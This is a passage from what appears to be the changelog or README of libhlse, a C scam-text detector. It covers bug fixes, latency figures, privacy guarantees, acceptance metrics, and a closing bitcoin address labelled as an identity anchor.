  as whitespace. Fixed: detect UTF-8 sequence length, copy intact.
- **JP/ZH/KR keywords missed**: signal tables were EN-only. Fixed: full
  multilingual keyword tables + MATCH macro dispatching on first byte.
- **strtok_r segfault under -std=c11**: missing POSIX feature macro.
  Fixed: `-D_POSIX_C_SOURCE=200809L`.
- **Under-firing**: ransom/tech-support scored below ALERT threshold.
  Fixed: raised base_weight and per_hit_bonus on critical signals.

### Performance (in-process via libhlse.so)
- check_text short: 2.08 µs
- check_text long: 2.83 µs

### Privacy
- Zero network calls (CI-enforced)
- Zero environment reads
- Zero file I/O outside stdin/stdout

### Acceptance criteria (all PASS)
- recall ≥ 0.85 → 1.000
- FP rate ≤ 0.05 → 0.000
- F1 ≥ 0.85 → 1.000
- 72 tests green (27 unit + 45 property)

## Identity anchor

```
bitcoin:bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5
```
